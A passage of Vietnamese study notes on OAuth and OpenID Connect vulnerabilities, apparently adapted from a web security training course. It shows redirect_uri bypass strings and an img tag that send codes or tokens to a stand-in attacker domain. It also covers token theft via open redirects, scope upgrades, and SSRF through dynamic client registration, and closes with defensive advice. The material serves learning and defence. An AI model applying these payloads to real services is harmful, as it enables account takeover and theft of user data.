- Nếu bạn có thể thêm các giá trị phụ vào `redirect_uri` mặc định, bạn có thể khai thác sự khác biệt trong cách phân tích (parsing) URI giữa các thành phần khác nhau của dịch vụ OAuth. Ví dụ, bạn có thể thử các kỹ thuật như:

```
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```

Nếu bạn chưa quen với những kỹ thuật này, chúng tôi khuyến nghị đọc các nội dung về cách vượt qua các cơ chế phòng thủ SSRF thông thường và CORS.

Đôi khi bạn có thể gặp lỗ hổng **bẩn tham số phía máy chủ** (server-side parameter pollution). Để phòng ngừa, hãy thử gửi các tham số `redirect_uri` trùng lặp như sau:

```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```

Một số máy chủ cũng có xử lý đặc biệt với các URI `localhost` vì chúng thường được dùng trong phát triển. Trong một vài trường hợp, bất kỳ redirect URI nào bắt đầu bằng `localhost` có thể vô tình được cho phép trong môi trường production. Điều này có thể cho phép bạn vượt qua kiểm tra bằng cách đăng ký một tên miền như `localhost.evil-user.net`.

Cần lưu ý rằng bạn không nên chỉ thử riêng tham số `redirect_uri`. Trong thực tế, bạn thường cần thử nghiệm kết hợp thay đổi nhiều tham số. Đôi khi thay đổi một tham số có thể ảnh hưởng tới việc xác thực các tham số khác. Ví dụ, thay đổi `response_mode` từ `query` sang `fragment` đôi khi có thể hoàn toàn thay đổi cách phân tích `redirect_uri`, cho phép bạn gửi các URI mà bình thường bị chặn. Tương tự, nếu bạn thấy `web_message` response mode được hỗ trợ, điều này thường cho phép một phạm vi con miền (subdomain) rộng hơn trong `redirect_uri`.

---

### Đánh cắp code và access token thông qua trang proxy

---

Trên những mục tiêu kiên cố hơn, có thể bạn sẽ thấy dù thử thế nào cũng không thể đặt thành công một domain ngoại vi làm `redirect_uri`. Tuy nhiên, điều đó không có nghĩa là nên từ bỏ.

Ở giai đoạn này, bạn nên đã có hiểu biết tương đối rõ về những phần của URI có thể bị thao túng. Yếu tố then chốt bây giờ là dùng kiến thức đó để cố gắng mở rộng bề mặt tấn công bên trong chính ứng dụng client. Nói cách khác, hãy cố gắng tìm xem liệu bạn có thể thay đổi `redirect_uri` để trỏ tới bất kỳ trang nào khác trên một domain đã được whitelist hay không.

Cố gắng tìm cách mà bạn có thể truy cập thành công các subdomain hoặc đường dẫn khác. Ví dụ, URI mặc định thường nằm trên một đường dẫn liên quan tới OAuth, chẳng hạn `/oauth/callback`, mà thường không có nhiều thư mục con thú vị. Tuy nhiên, bạn có thể dùng mẹo di chuyển thư mục (directory traversal) để cấp một đường dẫn bất kỳ trên domain đó. Ví dụ:

```
https://client-app.com/oauth/callback/../../example/path
```

Có thể được diễn giải ở phía back-end thành:

```
https://client-app.com/example/path
```

Khi đã xác định được những trang khác mà bạn có thể đặt làm `redirect_uri`, hãy kiểm toán chúng để tìm các lỗ hổng có thể dùng để rò rỉ code hoặc token. Với **authorization code flow**, bạn cần tìm một lỗ hổng cho phép truy cập các tham số query; còn với **implicit grant type**, bạn cần trích xuất **URL fragment**.

Một trong những lỗ hổng hữu dụng nhất cho mục đích này là **open redirect**. Bạn có thể dùng nó như một proxy để chuyển hướng nạn nhân cùng với code hoặc token của họ tới một domain do attacker kiểm soát, nơi bạn có thể host bất kỳ script độc hại nào bạn muốn.

> Lưu ý rằng với **implicit grant type**, việc đánh cắp access token không chỉ cho phép bạn đăng nhập vào tài khoản nạn nhân trên ứng dụng client. Vì toàn bộ luồng implicit diễn ra qua trình duyệt, bạn còn có thể dùng token để gọi API tới resource server của dịch vụ OAuth. Điều này có thể cho phép bạn lấy dữ liệu nhạy cảm của người dùng mà giao diện web của ứng dụng client thường không hiển thị.
> 

[Lab: Stealing OAuth access tokens via an open redirect | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

Bên cạnh open redirect, bạn nên tìm bất kỳ lỗ hổng nào khác cho phép bạn trích xuất code hoặc token và gửi nó ra domain ngoại vi. Một vài ví dụ tốt bao gồm:

- JavaScript nguy hiểm xử lý tham số query và URL fragment
    
    Ví dụ, các script web messaging không an toàn có thể rất hữu dụng cho việc này. Trong một số kịch bản, bạn có thể phải tìm một chuỗi gadget dài hơn cho phép truyền token qua một loạt script trước khi cuối cùng rò rỉ nó ra domain ngoại vi của bạn.
    
- Lỗ hổng XSS
    
    Mặc dù XSS có thể gây ảnh hưởng lớn bản thân nó, thường chỉ có một khoảng thời gian ngắn attacker truy cập phiên của người dùng trước khi họ đóng tab hoặc điều hướng đi. Vì HTTPOnly thường được dùng cho cookie phiên, attacker thường không thể truy cập cookie trực tiếp bằng XSS. Tuy nhiên, bằng cách đánh cắp code hoặc token OAuth, attacker có thể truy cập tài khoản nạn nhân trong trình duyệt của chính họ. Điều này cho phép họ có nhiều thời gian hơn để khám phá dữ liệu người dùng và thực hiện hành động có hại, làm tăng đáng kể mức nghiêm trọng của lỗ hổng XSS.
    
- Lỗ hổng chèn HTML (HTML injection)
    
    Trong những trường hợp bạn không thể chèn JavaScript (ví dụ do CSP hạn chế hoặc lọc nghiêm ngặt), bạn vẫn có thể dùng chèn HTML đơn giản để đánh cắp authorization code. Nếu bạn có thể đặt `redirect_uri` tới một trang mà bạn có thể chèn nội dung HTML của riêng mình, bạn có thể rò rỉ code qua header Referer. Ví dụ, thẻ `<img src="evil-user.net">` khi cố fetch ảnh, một số trình duyệt (như Firefox) sẽ gửi toàn bộ URL trong header Referer của request, bao gồm cả query string.
    

[Lab: Stealing OAuth access tokens via a proxy page | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

---

### Xác thực scope không chặt chẽ

---

Trong bất kỳ luồng OAuth nào, người dùng phải phê duyệt quyền truy cập được yêu cầu dựa trên **scope** định nghĩa trong yêu cầu ủy quyền. Mã thông báo (token) kết quả chỉ cho phép ứng dụng khách truy cập đúng **scope** mà người dùng đã phê duyệt. Tuy nhiên, trong một số trường hợp, kẻ tấn công có thể “nâng cấp” một access token (dù là token bị đánh cắp hay lấy được bằng một ứng dụng khách độc hại) để có thêm quyền do việc kiểm tra phạm vi của dịch vụ OAuth bị lỗi. Quy trình để làm điều này phụ thuộc vào kiểu grant.

> Authorization code
> 

Với kiểu cấp quyền authorization code, dữ liệu người dùng được yêu cầu và gửi qua kênh server-to-server an toàn, mà kẻ tấn công bên thứ ba thường không thể thao túng trực tiếp. Tuy nhiên, vẫn có thể đạt được kết quả tương tự bằng cách đăng ký ứng dụng khách riêng của họ với dịch vụ OAuth.

Ví dụ, giả sử ứng dụng khách độc hại của kẻ tấn công ban đầu yêu cầu quyền truy cập địa chỉ email của người dùng bằng scope `openid email`. Sau khi người dùng phê duyệt, ứng dụng khách độc hại nhận một authorization code. Vì kẻ tấn công kiểm soát ứng dụng của họ, họ có thể thêm tham số `scope` khác trong yêu cầu trao đổi code/token chứa thêm `profile`:

```
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile
```

Nếu máy chủ không kiểm tra giá trị này so với scope trong yêu cầu ủy quyền ban đầu, đôi khi nó sẽ tạo một access token sử dụng scope mới và gửi token đó cho ứng dụng của kẻ tấn công:

```json
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```

Kẻ tấn công sau đó có thể dùng ứng dụng của họ để gọi API cần thiết và truy cập dữ liệu profile của người dùng.

> implicit
> 

Đối với kiểu cấp quyền implicit, access token được gửi qua trình duyệt, có nghĩa là kẻ tấn công có thể đánh cắp token liên quan tới các ứng dụng khách vô tội và dùng trực tiếp. Khi đã đánh cắp được access token, họ có thể gửi một yêu cầu dạng trình duyệt tới endpoint `/userinfo` của dịch vụ OAuth, đồng thời tự tay thêm một tham số `scope` mới vào.

Lý tưởng nhất, dịch vụ OAuth nên kiểm tra giá trị scope này so với scope đã được dùng khi tạo token, nhưng điều đó không phải lúc nào cũng xảy ra. Miễn là quyền truy cập sau điều chỉnh không vượt quá mức truy cập đã được cấp trước đó cho ứng dụng khách này, kẻ tấn công có thể truy cập thêm dữ liệu mà không cần sự chấp thuận bổ sung từ người dùng.

---

### Đăng ký người dùng không được xác minh

---

Khi xác thực người dùng thông qua OAuth, ứng dụng khách thường **ngầm giả định** rằng thông tin do nhà cung cấp OAuth lưu trữ là chính xác. Việc giả định này có thể rất **nguy hiểm**.

Một số trang web cung cấp dịch vụ OAuth cho phép người dùng **đăng ký tài khoản mà không xác minh đầy đủ các thông tin**, bao gồm trong một số trường hợp cả địa chỉ email. Kẻ tấn công có thể lợi dụng điều này bằng cách đăng ký một tài khoản với nhà cung cấp OAuth sử dụng cùng thông tin với người dùng mục tiêu, chẳng hạn một địa chỉ email đã biết. Ứng dụng khách sau đó có thể cho phép kẻ tấn công **đăng nhập thay cho nạn nhân** thông qua tài khoản gian lận này tại nhà cung cấp OAuth.

---

# OpenID Connect

---

Trong phần này, chúng tôi sẽ cung cấp một số thông tin nền tảng quan trọng về OpenID Connect nhằm giúp bạn hiểu một số lỗ hổng mà chúng tôi sẽ đề cập. Nếu bạn còn mới với OAuth nói chung và OpenID Connect nói riêng, chúng tôi khuyến nghị bạn đọc kỹ phần này trước khi thử hoàn thành các lab dựa trên OpenID của chúng tôi.

---

## OpenID Connect là gì?

---

OpenID Connect mở rộng giao thức OAuth để cung cấp một lớp nhận dạng (identity) và xác thực (authentication) chuyên biệt nằm trên phần triển khai OAuth cơ bản. Nó bổ sung một số chức năng đơn giản giúp hỗ trợ tốt hơn trường hợp sử dụng OAuth cho mục đích xác thực.

OAuth ban đầu không được thiết kế cho xác thực; nó nhằm mục đích ủy quyền truy cập vào các tài nguyên cụ thể giữa các ứng dụng. Tuy nhiên, nhiều website đã tùy biến OAuth để dùng như một cơ chế xác thực. Để làm điều này, họ thường yêu cầu quyền đọc một số dữ liệu người dùng cơ bản và, nếu được cấp quyền, sẽ giả định rằng người dùng đã tự xác thực ở phía nhà cung cấp OAuth.

Các cơ chế xác thực chỉ dựa trên OAuth như vậy còn xa mới lý tưởng. Trước hết, ứng dụng khách không có cách nào biết người dùng đã được xác thực khi nào, ở đâu, hoặc bằng cách nào. Vì mỗi cách triển khai đều là một giải pháp tùy biến, nên cũng không có chuẩn chung để yêu cầu dữ liệu người dùng cho mục đích này. Để hỗ trợ OAuth một cách đúng đắn, ứng dụng khách phải cấu hình cơ chế OAuth riêng cho từng nhà cung cấp, mỗi bên lại có các endpoint khác nhau, bộ scope riêng, v.v.

OpenID Connect giải quyết nhiều vấn đề trên bằng cách bổ sung các tính năng liên quan đến nhận dạng đã được tiêu chuẩn hóa, giúp xác thực qua OAuth vận hành đồng nhất và đáng tin cậy hơn.

---

## OpenID Connect hoạt động như nào?

---

OpenID Connect được gắn trực tiếp vào các luồng OAuth thông thường. Từ góc nhìn của ứng dụng khách, điểm khác biệt chính là có thêm một tập scope chuẩn hóa (giống nhau cho mọi nhà cung cấp), và một kiểu phản hồi mới: **id_token**.

---

### **Roles**

---

Các vai trò về cơ bản giống với OAuth, nhưng thuật ngữ có đôi chút khác biệt:

- **Relying party**: Ứng dụng yêu cầu xác thực người dùng (tương đương với OAuth client application).
- **End user**: Người dùng được xác thực (tương đương với OAuth resource owner).
- **OpenID provider (OP)**: Dịch vụ OAuth được cấu hình để hỗ trợ OpenID Connect.

---

### Claims và Scopes

---

- **Claims**: Là các cặp *key:value* biểu diễn thông tin về người dùng tại resource server. Ví dụ: `"family_name":"Montoya"`.
- Khác với OAuth cơ bản, nơi mà scope phụ thuộc vào từng nhà cung cấp, OpenID Connect dùng một tập scope chuẩn hóa, giống nhau cho tất cả.

Muốn sử dụng OpenID Connect, ứng dụng khách **bắt buộc** phải chỉ định scope `openid` trong yêu cầu ủy quyền. Ngoài ra, có thể thêm các scope chuẩn khác:

- `profile`
- `email`
- `address`
- `phone`

Mỗi scope sẽ cho phép đọc một tập claims cụ thể. Ví dụ: `openid profile` cho phép truy xuất các claim liên quan đến danh tính người dùng, như: `family_name`, `given_name`, `birth_date`, ...

---

### ID Token

---

Điểm bổ sung quan trọng khác của OpenID Connect là kiểu phản hồi **id_token**.

- **id_token** trả về một **JWT (JSON Web Token)** được ký bằng **JWS (JSON Web Signature)**.
- Phần payload của JWT chứa danh sách các claim dựa trên scope ban đầu. Nó cũng có thông tin về cách thức và thời điểm người dùng được xác thực lần cuối tại OAuth provider.
- Ứng dụng khách có thể dựa vào đó để quyết định người dùng đã được xác thực đủ hay chưa.

> **Lợi ích**
> 
- **Giảm số request**: Thay vì phải lấy access token rồi gửi thêm yêu cầu truy xuất dữ liệu người dùng, thì ngay sau khi user xác thực, `id_token` đã được gửi kèm, chứa đầy đủ thông tin nhận dạng cần thiết.
- **Tính toàn vẹn dữ liệu**: Dữ liệu trong `id_token` được bảo vệ bằng chữ ký số JWT thay vì chỉ dựa vào kênh tin cậy như trong OAuth cơ bản → giúp chống lại một số cuộc tấn công *man-in-the-middle*.

> ⚠ Tuy nhiên, khóa công khai để xác minh chữ ký thường được cung cấp qua endpoint chuẩn (`/.well-known/jwks.json`), cũng qua cùng kênh mạng, nên vẫn tồn tại khả năng bị tấn công trong một số tình huống.
> 

> Kết hợp nhiều response type
> 

OAuth hỗ trợ nhiều loại response type. Do đó, ứng dụng khách hoàn toàn có thể gửi yêu cầu kết hợp giữa OAuth cơ bản và OpenID Connect:

```
response_type=id_token token
response_type=id_token code
```

Trong trường hợp này, ứng dụng sẽ nhận được cả **`ID token`** và **`access token/code`** cùng lúc.

---

## Nhận diện OpenID Connect

---

Nếu ứng dụng khách đang **thực sự sử dụng OpenID Connect**, điều này sẽ thể hiện rõ ngay trong **authorization request**. Cách chắc chắn nhất để kiểm tra là xem có **scope bắt buộc `openid`** hay không.

Ngay cả khi quá trình đăng nhập ban đầu trông **không có vẻ dùng OpenID Connect**, bạn vẫn nên kiểm tra xem dịch vụ OAuth có hỗ trợ nó không. Có thể thử:

- Thêm scope `openid`, hoặc
- Đổi `response_type` sang `id_token`,
    
    và quan sát xem có xảy ra lỗi hay không.
    

Tương tự như OAuth cơ bản, bạn cũng nên xem tài liệu của nhà cung cấp OAuth để tìm thông tin về việc hỗ trợ OpenID Connect. Ngoài ra, trong nhiều trường hợp bạn có thể truy cập file cấu hình chuẩn thông qua endpoint:

```
/.well-known/openid-configuration
```

---

## Lỗ hổng OpenID Connect

---

Tiêu chuẩn của **OpenID Connect** nghiêm ngặt hơn nhiều so với **OAuth cơ bản**, điều này đồng nghĩa với việc thường ít có khả năng xảy ra các triển khai “quái gở” với lỗ hổng nghiêm trọng.

Tuy nhiên, vì OpenID Connect chỉ là một **lớp bổ sung nằm trên OAuth**, nên ứng dụng khách hoặc dịch vụ OAuth vẫn có thể bị khai thác bởi các **tấn công dựa trên OAuth** mà ta đã phân tích trước đó. Trên thực tế, bạn có thể đã để ý rằng tất cả các lab xác thực OAuth trong bộ bài tập đều sử dụng OpenID Connect.

Trong phần này, chúng ta sẽ tìm hiểu một số **lỗ hổng bổ sung** có thể phát sinh từ các **tính năng mở rộng** mà OpenID Connect đưa vào.

---

### Đăng ký client động không được bảo vệ

---

Tiêu chuẩn OpenID nêu ra một cách chuẩn hóa để cho phép các ứng dụng client đăng ký với OpenID provider. Nếu **dynamic client registration** được hỗ trợ, ứng dụng client có thể tự đăng ký bằng cách gửi một yêu cầu **POST** tới endpoint chuyên dụng `/registration`. Tên của endpoint này thường được cung cấp trong file cấu hình và tài liệu.

Trong thân yêu cầu, ứng dụng client gửi thông tin chính về bản thân dưới dạng JSON. Ví dụ: thường sẽ yêu cầu bao gồm một mảng các **redirect URI** đã được whitelist. Nó cũng có thể gửi một loạt thông tin bổ sung khác, như tên các endpoint mà họ muốn công khai, tên ứng dụng, v.v. Một yêu cầu đăng ký điển hình có thể trông giống như sau:

```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

OpenID provider nên yêu cầu ứng dụng client phải xác thực chính nó. Trong ví dụ phía trên, họ đang dùng một HTTP bearer token. Tuy nhiên, một số provider sẽ cho phép **dynamic client registration** mà không cần bất kỳ xác thực nào, điều này cho phép kẻ tấn công đăng ký ứng dụng client độc hại của riêng họ. Hệ quả có thể khác nhau tùy thuộc vào cách các giá trị do kẻ tấn công kiểm soát được sử dụng.

Ví dụ, bạn có thể để ý rằng một số thuộc tính này có thể được cung cấp dưới dạng URI. Nếu bất kỳ URI nào trong số này bị OpenID provider truy cập, điều này có khả năng dẫn tới **SSRF bậc hai** (second-order SSRF) trừ khi có những biện pháp bảo mật bổ sung được áp dụng.

[Lab: SSRF via OpenID dynamic client registration | Web Security Academy](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

---

### Cho phép yêu cầu ủy quyền theo tham chiếu

---

Cho đến lúc này, chúng ta đã xem cách chuẩn để gửi các tham số cần thiết cho authorization request, tức là qua query string. Một số OpenID provider cho phép bạn truyền những tham số này dưới dạng một JSON Web Token (JWT) thay vào đó. Nếu tính năng này được hỗ trợ, bạn có thể gửi một tham số duy nhất `request_uri` trỏ tới một JWT chứa các tham số OAuth còn lại và giá trị của chúng. Tùy cấu hình của dịch vụ OAuth, tham số `request_uri` này có thể là một vector tiềm tàng cho SSRF.

Bạn cũng có thể tận dụng tính năng này để vượt qua việc kiểm tra hợp lệ của các giá trị tham số. Một số máy chủ có thể thực hiện xác thực chuỗi truy vấn trong authorization request, nhưng lại không áp dụng đầy đủ cùng mức kiểm tra cho các tham số nằm trong JWT, bao gồm cả `redirect_uri`.

Để kiểm tra xem tùy chọn này có được hỗ trợ hay không, bạn nên tìm trường `request_uri_parameter_supported` trong file cấu hình và tài liệu. Ngoài ra, bạn cũng có thể thử thêm tham số `request_uri` để xem nó có hoạt động hay không. Bạn sẽ thấy một số máy chủ hỗ trợ tính năng này ngay cả khi họ không nêu rõ trong tài liệu.

---

# Bảo mật

---

Để ngăn chặn các lỗ hổng xác thực OAuth, cả **OAuth provider** và **ứng dụng client** đều phải triển khai cơ chế xác thực chặt chẽ cho các tham số quan trọng, đặc biệt là **`redirect_uri`**. Bản thân đặc tả OAuth hầu như không có bảo vệ sẵn, vì vậy trách nhiệm bảo mật thuộc về nhà phát triển.

Cần lưu ý rằng lỗ hổng có thể xuất hiện **ở cả phía client lẫn phía dịch vụ OAuth**. Dù bạn triển khai an toàn đến đâu, bạn vẫn phụ thuộc vào độ chắc chắn của bên còn lại.

---

## **OAuth service providers**

---

- **Yêu cầu client đăng ký whitelist `redirect_uris` hợp lệ**
    - Xác thực theo kiểu **so sánh byte chính xác tuyệt đối** (strict byte-for-byte).
    - Chỉ cho phép **khớp toàn bộ** thay vì dùng pattern matching.
    - Tránh cho phép kẻ tấn công truy cập các trang khác trong cùng domain đã whitelist.
- **Bắt buộc sử dụng tham số `state`**
    - Giá trị `state` nên gắn với session người dùng bằng dữ liệu **khó đoán và đặc thù phiên**, ví dụ hash chứa session cookie.
    - Giúp ngăn tấn công kiểu **CSRF** và khó khăn hơn cho attacker trong việc tái sử dụng mã ủy quyền bị đánh cắp.
- **Tại resource server**, cần kiểm tra:
    - Access token được cấp cho **đúng `client_id`** đang thực hiện request.
    - **Scope** khớp với scope ban đầu được cấp khi phát token.

---

## **OAuth client applications**

---

- **Hiểu rõ cách OAuth hoạt động** trước khi triển khai. Nhiều lỗ hổng đến từ việc lập trình viên không nắm rõ quy trình và cách kẻ tấn công có thể lợi dụng.
- **Luôn sử dụng tham số `state`**, dù nó không bắt buộc.
- **Gửi `redirect_uri`** không chỉ đến endpoint `/authorization` mà còn đến endpoint `/token`.
- **Mobile & Native app**:
    - Vì khó bảo mật `client_secret`, nên áp dụng cơ chế **PKCE (RFC 7636)** để giảm rủi ro bị chặn hoặc rò rỉ authorization code.
- **Với OpenID Connect `id_token`**:
    - Xác thực đúng theo chuẩn **JWS, JWE, và OpenID**.
- **Cẩn trọng với authorization code**:
    - Có thể bị rò rỉ qua **Referer header** khi load hình ảnh, script hoặc CSS từ domain ngoài.
    - Không được nhúng code này vào file JavaScript sinh động (dynamic JS), vì chúng có thể bị gọi từ domain ngoài qua thẻ `<script>`.
